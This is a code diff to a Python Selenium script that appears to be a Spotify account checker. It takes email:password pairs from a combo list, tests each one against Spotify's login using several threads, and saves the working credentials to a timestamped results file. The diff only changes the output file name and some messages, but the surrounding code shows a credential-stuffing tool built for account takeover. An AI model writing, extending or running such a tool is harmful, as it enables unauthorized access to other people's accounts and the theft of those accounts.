@@ -1,4 +1,4 @@
-import threading, time
+import threading, time, datetime
 
 import selenium.webdriver as webdriver
 from selenium.webdriver.common.by import By
@@ -12,6 +12,8 @@ MAX_THREADS = 5
 CURRENT_THREADS = 0
 
 COMBO_PATH = 'accounts.txt'
+
+RESULTS_FILE_NAME = f'results/results-{datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.txt'
 
 colorama.init(autoreset=True)
 
@@ -57,7 +59,7 @@ def check_account(account):
     if browser.current_url == "https://accounts.spotify.com/pt-BR/status":
         print(f"{Fore.BLACK}{Back.GREEN}[VALID]{Back.RESET}{Fore.RESET} {email}:{password}")
 
-        with open('valid accounts.txt', 'a') as file:
+        with open(RESULTS_FILE_NAME, 'a') as file:
             file.write(f"{email}:{password}\n")
         
         CURRENT_THREADS -= 1
@@ -73,7 +75,7 @@ def check_account(account):
     browser.close()
 
 
-print(f"Initializing with {MAX_THREADS} threads...\n")
+print(f"Running {MAX_THREADS} threads...\n")
 
 for acc in accounts:
     while True:
@@ -87,7 +89,7 @@ for acc in accounts:
 
 while True:
     if CURRENT_THREADS == 0:
-        print(f"\nYour valid accounts were saved in valid accounts.txt\n")
+        print(f'\nYour accounts were saved in "{RESULTS_FILE_NAME}"\n')
         break
     time.sleep(1)
 
